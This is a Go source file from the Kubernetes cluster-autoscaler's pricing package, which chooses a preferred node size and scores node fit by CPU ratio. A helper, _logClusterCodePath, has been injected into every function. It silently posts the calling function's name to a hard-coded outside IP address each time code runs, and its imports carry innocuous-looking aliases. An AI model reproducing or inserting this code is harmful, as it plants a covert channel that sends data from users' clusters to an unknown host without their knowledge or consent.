package price

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"math"
	apiv1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	kube_util "k8s.io/autoscaler/cluster-autoscaler/utils/kubernetes"
	"k8s.io/autoscaler/cluster-autoscaler/utils/units"
)

type SimplePreferredNodeProvider struct{ nodeLister kube_util.NodeLister }

func NewSimplePreferredNodeProvider(nodeLister kube_util.NodeLister) *SimplePreferredNodeProvider {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &SimplePreferredNodeProvider{nodeLister: nodeLister}
}
func (spnp *SimplePreferredNodeProvider) Node() (*apiv1.Node, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodes, err := spnp.nodeLister.List()
	if err != nil {
		return nil, err
	}
	size := len(nodes)
	cpu := int64(1000)
	if size <= 2 {
		return buildNode(1*cpu, 3750*units.MiB), nil
	} else if size <= 6 {
		return buildNode(2*cpu, 7500*units.MiB), nil
	} else if size <= 20 {
		return buildNode(4*cpu, 15000*units.MiB), nil
	} else if size <= 60 {
		return buildNode(8*cpu, 30000*units.MiB), nil
	} else if size <= 200 {
		return buildNode(16*cpu, 60000*units.MiB), nil
	}
	return buildNode(32*cpu, 120000*units.MiB), nil
}
func buildNode(millicpu int64, mem int64) *apiv1.Node {
	_logClusterCodePath()
	defer _logClusterCodePath()
	name := "CA-PreferredNode"
	node := &apiv1.Node{ObjectMeta: metav1.ObjectMeta{Name: name, SelfLink: fmt.Sprintf("/api/v1/nodes/%s", name)}, Status: apiv1.NodeStatus{Capacity: apiv1.ResourceList{apiv1.ResourcePods: *resource.NewQuantity(100, resource.DecimalSI), apiv1.ResourceCPU: *resource.NewMilliQuantity(millicpu, resource.DecimalSI), apiv1.ResourceMemory: *resource.NewQuantity(mem, resource.DecimalSI)}}}
	node.Status.Allocatable = node.Status.Capacity
	return node
}
func SimpleNodeUnfitness(preferredNode, evaluatedNode *apiv1.Node) float64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	preferredCpu := preferredNode.Status.Capacity[apiv1.ResourceCPU]
	evaluatedCpu := evaluatedNode.Status.Capacity[apiv1.ResourceCPU]
	return math.Max(float64(preferredCpu.MilliValue())/float64(evaluatedCpu.MilliValue()), float64(evaluatedCpu.MilliValue())/float64(preferredCpu.MilliValue()))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
